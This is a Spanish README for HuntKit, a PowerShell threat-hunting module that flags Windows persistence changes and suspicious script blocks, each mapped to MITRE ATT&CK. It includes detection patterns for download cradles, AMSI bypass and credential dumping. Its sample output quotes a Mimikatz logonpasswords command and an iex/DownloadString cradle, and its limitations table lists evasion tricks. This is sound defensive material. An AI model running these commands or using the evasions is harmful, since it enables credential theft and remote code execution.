# HuntKit

> Modulo PowerShell de Threat Hunting para Windows — Persistencia · Script-Block · MITRE ATT&CK

[![CI](https://github.com/DamianMacancela/HuntKit/actions/workflows/ci.yml/badge.svg)](https://github.com/DamianMacancela/HuntKit/actions)
[![PowerShell 5.1+](https://img.shields.io/badge/PowerShell-5.1%2B-blue?logo=powershell)](https://github.com/PowerShell/PowerShell)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D6?logo=windows)](https://www.microsoft.com/windows)

---

## El problema que resuelve

En respuesta a incidentes y threat hunting, las preguntas urgentes son simples pero dificiles de responder rapido:

- **?Que mecanismo de persistencia nuevo aparecio entre ayer y hoy?**
- **?Alguien ejecuto un script PowerShell codificado en Base64 en las ultimas 6 horas?**
- **?Hay una suscripcion WMI que no estaba hace 20 minutos?**

Las herramientas genericas responden con listas de 300 lineas. HuntKit responde con **diffs**.

El enfoque es `baseline + hash SHA-256`: capturas el estado "bueno" del sistema y detectas cualquier desvio en tiempo real, con cada cambio etiquetado con su tecnica ATT&CK.

---

## Capacidades y mapeo ATT&CK

| Fuente | Funcion / Regla | ID ATT&CK | Descripcion |
|---|---|---|---|
| Registry Run Keys | `Get-RunKeyPersistence` | **T1547.001** | HKLM + HKCU + WOW6432Node Run/RunOnce |
| Scheduled Tasks | `Get-ScheduledTaskPersistence` | **T1053.005** | Todas las tareas, excluye `\Microsoft\Windows\*` por defecto |
| Services | `Get-ServicePersistence` | **T1543.003** | Servicios fuera de `C:\Windows` via CIM |
| WMI Subscriptions | `Get-WmiPersistence` | **T1546.003** | CommandLineEventConsumer + ActiveScriptEventConsumer |
| Startup Folders | `Get-StartupFolderPersistence` | **T1547.001** | User + Common Startup, SHA-256 de cada archivo |
| EID 4104 SB001 | `Test-ScriptBlockText` | **T1027** | `FromBase64String` |
| EID 4104 SB002 | `Test-ScriptBlockText` | **T1059.001** | `-enc`/`-EncodedCommand` + Base64 largo |
| EID 4104 SB003 | `Test-ScriptBlockText` | **T1059.001** | `iex` / `Invoke-Expression` |
| EID 4104 SB004 | `Test-ScriptBlockText` | **T1105** | Download cradle (`Net.WebClient`, `iwr`, `BITS`) |
| EID 4104 SB005 | `Test-ScriptBlockText` | **T1562.001** | AMSI bypass (`AmsiUtils`, `amsiInitFailed`) |
| EID 4104 SB006 | `Test-ScriptBlockText` | **T1562.001** | Defender exclusion/disable (`Set/Add-MpPreference`) |
| EID 4104 SB007 | `Test-ScriptBlockText` | **T1620** | Reflective assembly load |
| EID 4104 SB008 | `Test-ScriptBlockText` | **T1055** | Win32 memory API (`VirtualAlloc`, `CreateRemoteThread`) |
| EID 4104 SB009 | `Test-ScriptBlockText` | **T1003.001** | Credential dumping (`Invoke-Mimikatz`, `sekurlsa`) |
| EID 4104 SB010 | `Test-ScriptBlockText` | **T1059.001** | `-WindowStyle Hidden`, `ExecutionPolicy Bypass` |
| EID 4104 SB011 | `Test-ScriptBlockText` | **T1027** | Char-code obfuscation (`[char]105+[char]101+...`) |
| **Regla compuesta SB100** | `Test-ScriptBlockText` | **T1059.001, T1105** | Download (Low) + IEX (Medium) = **cradle (High)** |

---

## Instalacion

```powershell
# Clonar o descargar el repositorio
git clone https://github.com/DamianMacancela/HuntKit.git
cd HuntKit

# Importar el modulo
Import-Module .\HuntKit\HuntKit.psd1 -Force

# Verificar funciones disponibles
Get-Command -Module HuntKit
```

### Prerrequisito: habilitar Script Block Logging (una vez, como Administrador)

Sin este paso, `Find-SuspiciousScriptBlock` no encontrara eventos 4104.

```powershell
$k = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
New-Item $k -Force | Out-Null
Set-ItemProperty $k EnableScriptBlockLogging 1 -Type DWord
```

---

## Uso rapido

### 1. Guardar un baseline

```powershell
Import-Module .\HuntKit\HuntKit.psd1 -Force
Save-PersistenceBaseline -Path .\baseline.json -Verbose
```

**Salida esperada (sanitizada):**
```
VERBOSE: Collecting Run Keys...
VERBOSE: Collecting Scheduled Tasks...
VERBOSE: Collecting Services...
VERBOSE: Collecting WMI Subscriptions...
VERBOSE: Collecting Startup Folders...
[+] Baseline guardado: .\baseline.json  (312 items)
```

### 2. Detectar drift

```powershell
# Simular persistencia nueva (benigna, para test)
Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' HuntKitTest 'notepad.exe'

Get-PersistenceDrift -BaselinePath .\baseline.json
```

**Salida real (sanitizada, host y SID omitidos):**
```
[Added] RunKey | T1547.001 | HuntKitTest
    Location: HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    Command : notepad.exe
```

```powershell
# Limpiar el test
Remove-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' HuntKitTest

Get-PersistenceDrift -BaselinePath .\baseline.json
# [OK] Sin cambios en mecanismos de persistencia.
```

### 3. Exportar reporte HTML

```powershell
Get-PersistenceDrift -BaselinePath .\baseline.json -OutputPath .\drift_report.html
# [+] Reporte HTML: .\drift_report.html
```

### 4. Analizar Script Blocks (ultimas 6 horas)

```powershell
Find-SuspiciousScriptBlock -Since (Get-Date).AddHours(-6) -MinSeverity High
```

**Salida real (sanitizada):**
```
[Critical] SB009 | T1003.001 | Credential dumping
    Time   : 02/10/2026 17:31:02
    Path   : C:\Users\[REDACTED]\Documents\test.ps1
    Snippet: ...Invoke-Mimikatz -Command sekurlsa::logonpasswords...

[High] SB003,SB004,SB100 | T1059.001,T1105 | Download cradle + ejecucion directa
    Time   : 02/10/2026 17:30:14
    Path   :
    Snippet: ...iex((New-Object Net.WebClient).DownloadString('http://[REDACTED]'))...
```

### 5. Triage rapido (sin baseline)

```powershell
Get-PersistenceSnapshot | Format-Table Type, Mitre, Name, Command -AutoSize
```

---

## Flujo de datos

```
Persistencia: colectores ──> ConvertTo-PersistenceItem (Id=SHA256[16]) ──> Snapshot
              ──> Save-PersistenceBaseline (JSON + IntegrityHash)
              ──> Get-PersistenceDrift ──> Compare-PersistenceSnapshot (diff O(n))
                                       ──> Export-HuntReport (HTML + HtmlEncode)

ScriptBlock:  Get-WinEvent EID 4104 ──> Group por ScriptBlockId ──> reensamblar
              ──> Test-ScriptBlockText (11 reglas + SB100 compuesta)
              ──> filtro MinSeverity ──> Export-HuntReport
```

---

## Falsos positivos conocidos

Parte de construir una herramienta honesta es documentar cuando **no** debes alertar:

| Caso | Por que aparece | Como distinguirlo |
|---|---|---|
| Adobe/Teams en Run Keys | Actualizadores instalan y remueven entradas con cada update | `Get-AuthenticodeSignature` sobre el ejecutable |
| Tareas de `\Microsoft\Windows\*` | Windows crea cientos de tareas legitimas | Filtradas por defecto; usa `-IncludeMicrosoft` solo en auditorias |
| `iex` en scripts de Chocolatey o PSReadLine | Usan `Invoke-Expression` internamente | Correlacionar con la ruta del script en el evento 4103 |
| `Invoke-WebRequest` en scripts de administracion | Admins usan `iwr` a diario para descargar paquetes | SB004 es `Low` precisamente por esto; solo escala si va con IEX (SB100) |
| WMI sin subscripciones | Normal en la mayoria de sistemas | La **ausencia** de subscripciones en `root\subscription` es la condicion segura |

---

## Limitaciones (honestidad tecnica)

| Limitacion | Impacto | Mitigacion posible |
|---|---|---|
| **Script Block Logging desactivable** | Un atacante con admin puede deshabilitar EID 4104 antes de ejecutar | Proteger la clave de registro con GPO bloqueada |
| **Baseline manipulable** | Atacante con escritura al disco puede alterar el JSON | Guardar baseline en share de solo lectura o SIEM; verificar `IntegrityHash` |
| **HKCU parcial** | Solo captura el usuario de la sesion actual | Ejecutar por cada cuenta de usuario del sistema |
| **Evasion por fragmentacion parcheada** | El reensamblado de bloques 4104 cubre la mayoria de casos | Un atacante que divida el payload en >1000 fragmentos podria crear ruido excesivo |
| **Evasion por concatenacion** | `'Down'+'loadString'` no matchea SB004 | Agregar reglas de concatenacion (ver roadmap) |
| **Evasion por `[char]` avanzado** | SB011 cubre 3+ chars consecutivos; variantes mas espaciadas evaden | Aumentar el umbral o usar clustering de tokens |
| **Carpeta HuntKit como evasion de autoexclusion** | Un script en una ruta que contenga `*HuntKit*` sera ignorado | Excluir por hash del modulo en lugar de nombre de ruta |

---

## Tests

```powershell
# Instalar dependencias
Install-Module Pester           -RequiredVersion 5.7.1 -Scope CurrentUser -Force -SkipPublisherCheck
Install-Module PSScriptAnalyzer -MinimumVersion 1.21   -Scope CurrentUser -Force

# Ejecutar lint local (exactamente igual que en CI)
Invoke-ScriptAnalyzer .\HuntKit -Recurse -Severity Warning,Error -ExcludeRule PSAvoidUsingWriteHost

# Ejecutar tests
Invoke-Pester .\tests -CI
```

### Que cubren los tests

| Describe | Casos | Que valida |
|---|---|---|
| `Get-HuntId` | 4 tests | Formato hex-16, determinismo, unicidad, sensibilidad al cambio |
| `ConvertTo-PersistenceItem` | 2 tests | Estructura del objeto, estabilidad del Id |
| `Test-ScriptBlockText` | 22 tests | Las 11 reglas individuales, SB100 compuesta, falsos positivos controlados |
| Casos de evasion | 3 tests | Concatenacion que evade (documentado), case-insensitive que detecta |
| `Compare-PersistenceSnapshot` | 6 tests | Added, Removed, sin cambios, baseline vacio, current vacio, cambio de comando |
| `Save/Get-PersistenceDrift` | 3 tests | JSON v2.0 valido, drift cero, Run Key real en sistema |
| `Export-HuntReport` | 4 tests | HTML generado, titulo, **anti-XSS** (`<script>` codificado), reporte vacio |

---

## Estructura del repositorio

```
HuntKit/
├── HuntKit/
│   ├── HuntKit.psm1      # Modulo principal (~900 lineas)
│   └── HuntKit.psd1      # Manifiesto (version, tags, funciones publicas)
├── tests/
│   ├── HuntKit.Tests.ps1 # Suite Pester v5 (39 tests)
│   └── data/             # Archivos .evtx sinteticos para tests offline
├── .github/
│   └── workflows/
│       └── ci.yml        # Validate manifest + PSScriptAnalyzer + Pester
├── .gitignore            # baseline.json, *.html, *.evtx nunca al repo
├── LICENSE               # MIT
├── SECURITY.md           # Divulgacion responsable
└── README.md
```

---

## Roadmap

| Mejora | Señal tecnica |
|---|---|
| `Get-AuthenticodeSignature` + hash del binario en cada item | Triage real, no solo enumeracion |
| Correlacion EID 7045/4698 con el drift de servicios | Telemetria complementaria |
| Exportar reglas a formato Sigma | Interoperabilidad con SIEM (Splunk, Elastic) |
| Tests de evasion con concatenacion y `-Join [char[]]` | Pensamiento adversarial documentado |
| Baseline firmado GPG o hash en archivo separado | Conciencia de integridad de evidencia |
| `.evtx` sintetico en `tests/data/` para tests offline | Reproducibilidad sin acceso al sistema |

---

## Preguntas que debes poder responder sobre este codigo

| Pregunta | Respuesta |
|---|---|
| ?Por que baseline y no lista negra? | La persistencia legitima varia por host; el **cambio** es la senal, no la presencia |
| ?Por que reensamblar bloques 4104? | PowerShell parte scripts grandes en multiples eventos; sin reensamblado, un payload partido evade cualquier regex |
| ?Como evade un atacante? | Desactivar logging, concatenacion de strings, carpeta con nombre HuntKit, fragementar en >1000 partes |
| ?Por que `HtmlEncode` en el reporte? | El payload analizado es input hostil; sin codificacion, un `<script>` en el nombre de un item ejecutaria JS al abrir el HTML |
| ?Donde guardar el baseline? | Fuera del host (share read-only, SIEM); un atacante local podria modificarlo |

---

## Autor

**Damian Fabricio Macancela Caguana**
Estudiante de Ciberseguridad (ITSA) y Derecho (UTPL) | Azuay, Ecuador

[![LinkedIn](https://img.shields.io/badge/LinkedIn-0A66C2?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/damian-fabricio-macancela-b0a24b3b5)
[![ZeroTrust Redact](https://img.shields.io/badge/ZeroTrust_Redact-Live-00b894?style=flat-square)](https://zerotrust-redact.vercel.app/)
[![Blog](https://img.shields.io/badge/Blog-000000?style=flat-square&logo=github&logoColor=white)](https://damianmacancela.github.io)

---

*Este modulo se desarrolló como parte de mi formacion practica en threat hunting y analisis DFIR. Toda prueba documentada se realizo en entorno de laboratorio controlado bajo autorizacion expresa.*

**Disclaimer:** HuntKit es exclusivamente para uso etico en sistemas sobre los que tienes autorizacion expresa. El uso en sistemas ajenos puede constituir un delito.
